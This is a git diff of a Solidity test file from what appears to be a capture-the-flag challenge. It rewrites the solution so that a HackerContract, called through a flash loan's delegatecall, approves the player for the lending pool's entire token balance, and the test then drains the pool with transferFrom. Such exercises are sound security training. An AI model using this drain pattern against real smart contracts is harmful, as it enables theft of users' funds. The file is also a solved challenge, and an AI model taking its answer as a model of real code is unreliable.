@@ -36,18 +36,20 @@ contract Challenge1Test is Test {
         //////////////////////////////*/
 
         //=== this is a sample of flash loan usage
-        Exploit exploit = new Exploit();
+        HackerContract hackerContract = new HackerContract();
 
+        /*  We're taking advantaje that the flashLoan makes a delegate call to the borrower
+            So when making a flash Loan, the target is going to call our contract
+            We encode the call to our function
+            This function is going to make an approve, so the balance is not modified
+        */ 
         target.flashLoan(
-          address(exploit),
-          abi.encodeWithSignature(
-            "Hack(address)", player
-          )
+          address(hackerContract),
+          abi.encodeWithSignature("Hack(address,address)", address(token), player)
         );
 
-        uint256 balance = token.balanceOf(address(target));
-
-        token.transferFrom(address(target), player, balance);
+        // Finally we transfer all token to us
+        token.transferFrom(address(target), player, token.balanceOf(address(target)));
 
         vm.stopPrank();
 
@@ -59,6 +61,16 @@ contract Challenge1Test is Test {
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 ////////////////////////////////////////////////////////////*/
+// @dev this is the solution
+contract HackerContract {
+    using Address for address;
+    using SafeERC20 for IERC20;
+
+    function Hack(address token, address player) public {
+        IERC20(token).approve(player, IERC20(token).balanceOf(address(this)));
+    }
+}
+
 
 // @dev this is a demo contract that is used to receive the flash loan
 contract FlashLoandReceiverSample {
@@ -75,19 +87,5 @@ contract FlashLoandReceiverSample {
         if (profit > 0) {
             token.transfer(_user, balanceAfter - balanceBefore);
         }
-    }
-}
-
-// @dev this is the solution
-contract Exploit {
-    using Address for address;
-    using SafeERC20 for IERC20;
-
-    /// @dev Token contract address to be used for lending.
-    //IERC20 immutable public token;
-    IERC20 public token;
-
-    function Hack(address player) public {
-        token.approve(player, token.balanceOf(address(this)));
     }
 }
